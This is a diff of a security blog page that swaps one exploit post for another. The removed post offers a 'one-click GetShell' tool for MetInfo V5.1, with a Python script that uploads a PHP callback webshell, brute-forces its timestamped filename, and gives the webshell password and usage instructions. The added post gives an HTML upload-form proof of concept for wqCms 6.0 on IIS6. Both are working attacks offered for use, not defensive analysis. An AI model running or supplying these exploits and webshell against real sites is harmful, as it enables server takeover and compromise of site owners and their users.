@@ -89,7 +89,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Hacker,Tools," />
+  <meta name="keywords" content="Hacker," />
 
 
 
@@ -107,21 +107,22 @@
 
 
 
-<meta name="description" content="漏洞解析：
-config/config.inc.php12345678910111213141516171819202122232425262728293031$langoks = $db-&amp;gt;get_one(&quot;SELECT * FROM $met_lang WHERE lang=&apos;$lang&apos;&quot;);if(!$langoks)die(&apos;No data in the database,plea">
+<meta name="description" content="2017-02-15发布
+一、漏洞利用点漏洞文件:admin_UploadDataHandler.ashx 自定义构造上传点">
 <meta property="og:type" content="article">
-<meta property="og:title" content="MetInfo V5.1 GetShell一键化工具">
-<meta property="og:url" content="http://akkuman.coding.me/2016/06/08/ciztyw1gv00081svqw920atun.html">
+<meta property="og:title" content="wqCms6.0在IIS6的Getshell">
+<meta property="og:url" content="http://akkuman.coding.me/2017/02/22/ciztz0rj1001g6gvqh383qre3.html">
 <meta property="og:site_name" content="Akkuman Blog">
-<meta property="og:description" content="漏洞解析：
-config/config.inc.php12345678910111213141516171819202122232425262728293031$langoks = $db-&amp;gt;get_one(&quot;SELECT * FROM $met_lang WHERE lang=&apos;$lang&apos;&quot;);if(!$langoks)die(&apos;No data in the database,plea">
-<meta property="og:image" content="http://7xusrl.com1.z0.glb.clouddn.com/MetInfo5.1GetshellGui.png">
-<meta property="og:updated_time" content="2016-10-29T07:07:05.903Z">
+<meta property="og:description" content="2017-02-15发布
+一、漏洞利用点漏洞文件:admin_UploadDataHandler.ashx 自定义构造上传点">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/02/22/58ad9095a4fe5.jpg">
+<meta property="og:image" content="https://ooo.0o0.ooo/2017/02/22/58ad8ebcee2cf.jpg">
+<meta property="og:updated_time" content="2017-03-03T14:48:13.452Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="MetInfo V5.1 GetShell一键化工具">
-<meta name="twitter:description" content="漏洞解析：
-config/config.inc.php12345678910111213141516171819202122232425262728293031$langoks = $db-&amp;gt;get_one(&quot;SELECT * FROM $met_lang WHERE lang=&apos;$lang&apos;&quot;);if(!$langoks)die(&apos;No data in the database,plea">
-<meta name="twitter:image" content="http://7xusrl.com1.z0.glb.clouddn.com/MetInfo5.1GetshellGui.png">
+<meta name="twitter:title" content="wqCms6.0在IIS6的Getshell">
+<meta name="twitter:description" content="2017-02-15发布
+一、漏洞利用点漏洞文件:admin_UploadDataHandler.ashx 自定义构造上传点">
+<meta name="twitter:image" content="https://ooo.0o0.ooo/2017/02/22/58ad9095a4fe5.jpg">
 
 
 
@@ -149,13 +150,13 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
 
 
 
-  <link rel="canonical" href="http://akkuman.coding.me/2016/06/08/ciztyw1gv00081svqw920atun.html"/>
+  <link rel="canonical" href="http://akkuman.coding.me/2017/02/22/ciztz0rj1001g6gvqh383qre3.html"/>
 
 
 
 
 
-  <title> MetInfo V5.1 GetShell一键化工具 | Akkuman Blog </title>
+  <title> wqCms6.0在IIS6的Getshell | Akkuman Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -328,7 +329,7 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://akkuman.coding.me/2016/06/08/ciztyw1gv00081svqw920atun.html">
+    <link itemprop="mainEntityOfPage" href="http://akkuman.coding.me/2017/02/22/ciztz0rj1001g6gvqh383qre3.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Akkuman">
@@ -349,7 +350,7 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
             
             
               
-                MetInfo V5.1 GetShell一键化工具
+                wqCms6.0在IIS6的Getshell
               
             
           </h1>
@@ -364,8 +365,8 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-06-08T22:40:32+08:00">
-                2016-06-08
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-02-22T21:20:55+08:00">
+                2017-02-22
               </time>
             
 
@@ -405,8 +406,8 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2016/06/08/ciztyw1gv00081svqw920atun.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/06/08/ciztyw1gv00081svqw920atun.html" itemprop="commentCount"></span>
+                <a href="/2017/02/22/ciztz0rj1001g6gvqh383qre3.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/02/22/ciztz0rj1001g6gvqh383qre3.html" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -432,48 +433,11 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
       
 
       
-        <hr>
-<h1 id="漏洞解析："><a href="#漏洞解析：" class="headerlink" title="漏洞解析："></a>漏洞解析：</h1><hr>
-<p><strong>config/config.inc.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">$langoks = $db-&gt;get_one(<span class="string">"SELECT * FROM $met_lang WHERE lang='$lang'"</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!$langoks)<span class="keyword">die</span>(<span class="string">'No data in the database,please reinstall.'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!$langoks[useok]&amp;&amp;!$metinfoadminok)okinfo(<span class="string">'../404.html'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(count($met_langok)==<span class="number">1</span>)$lang=$met_index_type;</div><div class="line"></div><div class="line">$query = <span class="string">"SELECT * FROM $met_config WHERE lang='$lang' or lang='metinfo'"</span>;<span class="comment">//看这里</span></div><div class="line"></div><div class="line">$result = $db-&gt;query($query);</div><div class="line"></div><div class="line"><span class="keyword">while</span>($list_config= $db-&gt;fetch_array($result))&#123;</div><div class="line"></div><div class="line">	<span class="keyword">if</span>($metinfoadminok)$list_config[<span class="string">'value'</span>]=str_replace(<span class="string">'"'</span>, <span class="string">'&amp;#34;'</span>, str_replace(<span class="string">"'"</span>, <span class="string">'&amp;#39;'</span>,$list_config[<span class="string">'value'</span>]));</div><div class="line"></div><div class="line">	$settings_arr[]=$list_config;</div><div class="line"></div><div class="line">	<span class="keyword">if</span>($list_config[<span class="string">'columnid'</span>])&#123;</div><div class="line"></div><div class="line">		$settings[$list_config[<span class="string">'name'</span>].<span class="string">'_'</span>.$list_config[<span class="string">'columnid'</span>]]=$list_config[<span class="string">'value'</span>];</div><div class="line"></div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line"></div><div class="line">		$settings[$list_config[<span class="string">'name'</span>]]=$list_config[<span class="string">'value'</span>];</div><div class="line"></div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">@extract($settings);</div></pre></td></tr></table></figure></p>
-<hr>
-<a id="more"></a>
-<p>访问</p>
-<p><a href="http:///localhost/metinfo5.1/index.php?lang=metinfo" target="_blank" rel="external">http:///localhost/metinfo5.1/index.php?lang=metinfo</a></p>
-<p><code>SELECT * FROM met_config WHERE lang=&#39;metinfo&#39; or lang=&#39;metinfo&#39;</code></p>
-<hr>
-<h2 id="文件命名方式："><a href="#文件命名方式：" class="headerlink" title="文件命名方式："></a>文件命名方式：</h2><hr>
-<p><strong>/feedback/uploadfile_save.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">srand((double)microtime() * <span class="number">1000000</span>);</div><div class="line"></div><div class="line">$rnd = rand(<span class="number">100</span>, <span class="number">999</span>);</div><div class="line"></div><div class="line">$name = date(<span class="string">'U'</span>) + $rnd;</div><div class="line"></div><div class="line">$name = $name.<span class="string">"."</span>.$ext;</div></pre></td></tr></table></figure></p>
-<p><strong>文件保存在/upload/file/目录</strong></p>
-<p>命名方式就是时间戳去掉后三位，紧接着一个三位数的随机数</p>
-<p>可爆破：</p>
-<p>如</p>
-<p><a href="http://127.0.0.1/upload/file/1465394396.php" target="_blank" rel="external">http://127.0.0.1/upload/file/1465394396.php</a></p>
-<hr>
-<h1 id="一键化利用工具："><a href="#一键化利用工具：" class="headerlink" title="一键化利用工具："></a>一键化利用工具：</h1><hr>
-<p><strong>本程序基于python编写</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> Queue</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"></div><div class="line">headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.10 Safari/537.36'</span>&#125;</div><div class="line"></div><div class="line">urls = Queue.Queue()</div><div class="line"><span class="comment">#http://hb.jhxjd.com/upload/file/1441445378.php</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">bp</span><span class="params">(urls,time_out)</span>:</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">not</span> urls.empty():</div><div class="line">        base_url = urls.get()</div><div class="line">        response = <span class="keyword">None</span></div><div class="line"></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            time.sleep(int(time_out))<span class="comment">#延时设置</span></div><div class="line">            response = requests.get(base_url,headers=headers)</div><div class="line">            <span class="keyword">if</span> response.status_code == <span class="number">404</span>:</div><div class="line">                <span class="keyword">print</span> <span class="string">'Not Fount----%s\n'</span> % base_url</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">continue</span></div><div class="line">        <span class="keyword">finally</span>:</div><div class="line">            <span class="keyword">if</span> response:</div><div class="line">                <span class="keyword">with</span> open(<span class="string">'url.txt'</span>,<span class="string">'a+'</span>) <span class="keyword">as</span> f:</div><div class="line">                    f.write(<span class="string">'%s?e=YXNzZXJ0\n'</span>%base_url)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(target_url,thread_num,time_out)</span>:</span></div><div class="line"></div><div class="line">    <span class="comment">#取出当前时间戳并删除后四位</span></div><div class="line">    now = str(int(time.time()))[:<span class="number">-4</span>]</div><div class="line"></div><div class="line">    <span class="comment">#将所有的待爆破地址遍历并加入队列</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">100</span>,<span class="number">1000</span>):</div><div class="line">            num_str = <span class="string">''</span>.join((str(i),str(j)))</div><div class="line">            url = <span class="string">''</span>.join((<span class="string">'%s/upload/file/%s'</span> % (target_url,now),num_str,<span class="string">'.php'</span>))</div><div class="line">            urls.put(url)</div><div class="line"></div><div class="line">    <span class="comment">#上传文件</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">'xiaoma.php'</span>,<span class="string">'w+'</span>) <span class="keyword">as</span> fi:</div><div class="line">        fi.write(<span class="string">"&lt;?php $e = $_REQUEST['e'];register_shutdown_function(base64_decode($e), $_REQUEST['Akkuman']);?&gt;"</span>)</div><div class="line">    data = &#123;</div><div class="line">            <span class="string">'fd_para[1][para]'</span>:<span class="string">'filea'</span>,</div><div class="line">            <span class="string">'fd_para[1][type]'</span>:<span class="string">'5'</span></div><div class="line">            &#125;</div><div class="line">    files = &#123;<span class="string">'filea'</span>: open(<span class="string">"xiaoma.php"</span>, <span class="string">'rb'</span>)&#125;</div><div class="line">    upload_url = <span class="string">'%s/feedback/uploadfile_save.php?met_file_format=pphphp&amp;met_file_maxsize=9999&amp;lang=metinfo'</span> % target_url</div><div class="line">    res = requests.post(upload_url,data = data,files=files)</div><div class="line">    <span class="comment">#等待两秒  文件上传</span></div><div class="line">    time.sleep(<span class="number">2</span>)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">    <span class="comment">#启动多线程</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(thread_num)):</div><div class="line">        t = threading.Thread(target = bp,args=(urls,time_out,))</div><div class="line">        t.start()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'Example : %s http://www.xxx.com 20 0'</span> % sys.argv[<span class="number">0</span>]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        main(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>],sys.argv[<span class="number">3</span>])</div></pre></td></tr></table></figure>
-<p>程序略显粗糙</p>
-<p>为了方便，我也把他打包成了<strong>exe</strong></p>
-<p>然后闲着没事，想着简单地给他做了个<strong>界面</strong>,这样的<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/MetInfo5.1GetshellGui.png" alt="GUI"></p>
-<hr>
-<h1 id="文件说明"><a href="#文件说明" class="headerlink" title="文件说明"></a>文件说明</h1><hr>
-<blockquote>
-<p>MetInfo V5.1上传漏洞getshell利用工具</p>
-<p>   作者 : Akkuman</p>
-<p>漏洞原理详见<a href="http://www.wooyun.org/bugs/wooyun-2010-0139168" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0139168</a></p>
-<p>使用说明：<br>本目录有两个文件，一个py，一个exe<br>因为exe是py文件打包而成，故文件较大<br>64位系统测试使用通过</p>
-<p>如果你安装了py2.x环境  py文件使用方法<br>打开cmd<br>python baopo.py <a href="http://www.xxx.com" target="_blank" rel="external">http://www.xxx.com</a> 20 0<br>20是线程数，0是每次请求等待时间（网站限制时可设置为2或3）可以自己指定</p>
-<p>exe命令行文件使用方法<br>打开cmd<br>baopo.exe <a href="http://www.xxx.com" target="_blank" rel="external">http://www.xxx.com</a> 20 0<br>20是线程数，0是每次请求等待时间（网站限制时可设置为2或3）可以自己指定</p>
-<p>GUI程序，应该不用说</p>
-<p>关于getshell与结果<br>上传的是回调一句话木马<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;<span class="meta">&lt;?php</span> &gt;$e=$_REQUEST[<span class="string">'e'</span>];register_shutdown_function(base64_decode($e),$_&gt;REQUEST[<span class="string">'Akkuman'</span>]);<span class="meta">?&gt;</span></div><div class="line">&gt;</div></pre></td></tr></table></figure></p>
-<p>菜刀连接，密码是Akkuman</p>
-<p>爆破结果会生成在<strong>url.txt</strong></p>
-</blockquote>
-<hr>
-<h1 id="下载地址："><a href="#下载地址：" class="headerlink" title="下载地址："></a>下载地址：</h1><hr>
-<p><a href="http://cloud.189.cn/t/v263QbMJVJ3u" target="_blank" rel="external">(访问码:1475)</a></p>
-<p><em>转载请注明出处</em></p>
-<p><em>作者博客 hacktech.cn | 53xiaoshuo.com</em></p>
+        <p>2017-02-15发布</p>
+<h1 id="一、漏洞利用点"><a href="#一、漏洞利用点" class="headerlink" title="一、漏洞利用点"></a>一、漏洞利用点</h1><p>漏洞文件:admin_UploadDataHandler.ashx 自定义构造上传点<br><a id="more"></a></p>
+<h1 id="二、hack-it"><a href="#二、hack-it" class="headerlink" title="二、hack it"></a>二、hack it</h1><p><img src="https://ooo.0o0.ooo/2017/02/22/58ad9095a4fe5.jpg" alt="77e968abd5e5cb3e2c4cdfbe620568fa.jpg"><br><img src="https://ooo.0o0.ooo/2017/02/22/58ad8ebcee2cf.jpg" alt="7281e4d1334393ddcc1c4926ad0065a8.jpg"></p>
+<h1 id="三、POC"><a href="#三、POC" class="headerlink" title="三、POC"></a>三、POC</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/admin_UploadDataHandler.ashx"</span> <span class="attr">method</span>=<span class="string">"POST"</span><span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">input</span>  <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"uploadify"</span> /&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">input</span>  <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"saveFile"</span> <span class="attr">value</span>=<span class="string">"admin"</span> /&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"Upload"</span> <span class="attr">value</span>=<span class="string">"Submit Query"</span> /&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>转自群友论坛文章<a href="http://loner.fm/article.php?id=24236" target="_blank" rel="external">wobushou</a></p>
 
       
     </div>
@@ -520,8 +484,6 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
           
             <a href="/tags/Hacker/" rel="tag"># Hacker</a>
           
-            <a href="/tags/Tools/" rel="tag"># Tools</a>
-          
         </div>
       
 
@@ -533,8 +495,8 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/05/31/ciztyw1gb00001svqbwrmadk3.html" rel="next" title="discuz 不能上传头像提示can not write to the data/tmp folder">
-                <i class="fa fa-chevron-left"></i> discuz 不能上传头像提示can not write to the data/tmp folder
+              <a href="/2017/02/15/ciztz0rj0001e6gvq4ppeuj7f.html" rel="next" title="otunnel：一个和lcx差不多的端口转发的工具">
+                <i class="fa fa-chevron-left"></i> otunnel：一个和lcx差不多的端口转发的工具
               </a>
             
           </div>
@@ -542,10 +504,6 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/06/09/ciztyw1id001z1svqarcztpui.html" rel="prev" title="编码转换工具">
-                编码转换工具 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -560,10 +518,10 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
 
     <div class="post-spread">
       
-        <div class="ds-share flat" data-thread-key="2016/06/08/ciztyw1gv00081svqw920atun.html"
-     data-title="MetInfo V5.1 GetShell一键化工具"
+        <div class="ds-share flat" data-thread-key="2017/02/22/ciztz0rj1001g6gvqh383qre3.html"
+     data-title="wqCms6.0在IIS6的Getshell"
      data-content=""
-     data-url="http://akkuman.coding.me/2016/06/08/ciztyw1gv00081svqw920atun.html">
+     data-url="http://akkuman.coding.me/2017/02/22/ciztz0rj1001g6gvqh383qre3.html">
   <div class="ds-share-inline">
     <ul  class="ds-share-icons-16">
 
@@ -590,8 +548,8 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2016/06/08/ciztyw1gv00081svqw920atun.html"
-           data-title="MetInfo V5.1 GetShell一键化工具" data-url="http://akkuman.coding.me/2016/06/08/ciztyw1gv00081svqw920atun.html">
+      <div class="ds-thread" data-thread-key="2017/02/22/ciztz0rj1001g6gvqh383qre3.html"
+           data-title="wqCms6.0在IIS6的Getshell" data-url="http://akkuman.coding.me/2017/02/22/ciztz0rj1001g6gvqh383qre3.html">
       </div>
     
   </div>
@@ -786,7 +744,7 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞解析："><span class="nav-number">1.</span> <span class="nav-text">漏洞解析：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#文件命名方式："><span class="nav-number">1.1.</span> <span class="nav-text">文件命名方式：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#一键化利用工具："><span class="nav-number">2.</span> <span class="nav-text">一键化利用工具：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件说明"><span class="nav-number">3.</span> <span class="nav-text">文件说明</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#下载地址："><span class="nav-number">4.</span> <span class="nav-text">下载地址：</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#一、漏洞利用点"><span class="nav-number">1.</span> <span class="nav-text">一、漏洞利用点</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#二、hack-it"><span class="nav-number">2.</span> <span class="nav-text">二、hack it</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#三、POC"><span class="nav-number">3.</span> <span class="nav-text">三、POC</span></a></li></ol></div>
             
 
           </div>
